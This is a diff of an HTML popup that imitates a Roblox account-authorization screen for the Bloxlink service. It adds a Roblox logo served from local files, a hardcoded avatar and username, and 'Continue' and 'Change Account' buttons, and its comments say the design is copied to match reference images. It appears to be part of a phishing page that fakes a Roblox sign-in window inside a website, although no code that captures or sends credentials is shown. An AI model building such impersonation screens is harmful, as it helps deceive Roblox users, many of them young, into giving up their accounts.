@@ -653,24 +653,27 @@
         <button class="popup-close" id="popupClose" aria-label="Close">&times;</button>
       </div>
       
-      <!-- Stage 1: Roblox OAuth Authorization Screen (Matching Images 1, 2, 4) -->
+      <!-- Stage 1: Roblox Account Selection Screen (Matching Image 2) -->
       <div class="popup-content" id="authContent" style="padding: 0; text-align: left; height: calc(100% - 45px); display: flex; flex-direction: column;">
-        <!-- Top Section with subtle contrast & Roblox Logo (Official Image 3) -->
+        <!-- Top Section with subtle contrast & Roblox Logo -->
         <div style="background: #14161d; padding: 24px 44px 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.09);">
           <!-- Top Roblox Logo -->
           <div style="margin-bottom: 8px;">
             <img src="./assets/roblox-logo.png" alt="ROBLOX" style="height: 34px; width: auto; object-fit: contain; display: block;">
           </div>
           <!-- Centered Title -->
-          <h2 style="font-size: 21px; font-weight: 700; color: #ffffff; text-align: center; margin: 12px 0 6px;">Authorize with Roblox OAuth</h2>
+          <h2 style="font-size: 20px; font-weight: 700; color: #ffffff; text-align: center; margin: 12px 0 6px;">Select Account to Continue to Bloxlink</h2>
         </div>
 
-        <!-- Bottom Section with Bloxlink Badge & Action Buttons -->
+        <!-- Bottom Section with Roblox User Avatar, Confirmation, & Buttons -->
         <div style="background: #0d0f14; flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px 44px 30px;">
-          <div style="width: 76px; height: 76px; border-radius: 50%; background: #de4343; display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 4px 18px rgba(222, 67, 67, 0.35); margin-bottom: 10px;">
-            <img src="./assets/bloxlink-icon.png" alt="Bloxlink" style="width: 100%; height: 100%; object-fit: cover;">
+          <p style="color: #94a3b8; font-size: 13.5px; margin-bottom: 16px;">Is that the account you wish to use?</p>
+
+          <!-- Dynamic Roblox Avatar Image -->
+          <div style="width: 82px; height: 82px; border-radius: 50%; background: #161922; display: flex; align-items: center; justify-content: center; overflow: hidden; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6); margin-bottom: 8px; border: 1px solid rgba(255, 255, 255, 0.08);">
+            <img id="robloxAvatarImg" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular" alt="Roblox User Avatar" style="width: 100%; height: 100%; object-fit: cover;">
           </div>
-          <span style="font-size: 15px; font-weight: 600; color: #ffffff; margin-bottom: 26px;">Bloxlink</span>
+          <span id="robloxAccountName" style="font-size: 15px; font-weight: 600; color: #ffffff; margin-bottom: 24px;">theyhategabriel</span>
 
           <button id="btnContinue" style="width: 320px; max-width: 100%; padding: 11px 16px; background: #e5e7eb; color: #111827; font-weight: 600; font-size: 14px; border-radius: 6px; border: none; cursor: pointer; transition: all 0.2s;">Continue</button>
 
@@ -680,7 +683,7 @@
             <div style="flex: 1; height: 1px; background: rgba(255, 255, 255, 0.08);"></div>
           </div>
 
-          <button id="btnReturn" style="width: 320px; max-width: 100%; padding: 11px 16px; background: transparent; border: 1px solid #374151; color: #e5e7eb; font-weight: 500; font-size: 14px; border-radius: 6px; cursor: pointer; transition: all 0.2s;">Return to Bloxlink</button>
+          <button id="btnChangeAccount" style="width: 320px; max-width: 100%; padding: 11px 16px; background: transparent; border: 1px solid #374151; color: #e5e7eb; font-weight: 500; font-size: 14px; border-radius: 6px; cursor: pointer; transition: all 0.2s;">Change Account</button>
         </div>
       </div>
       
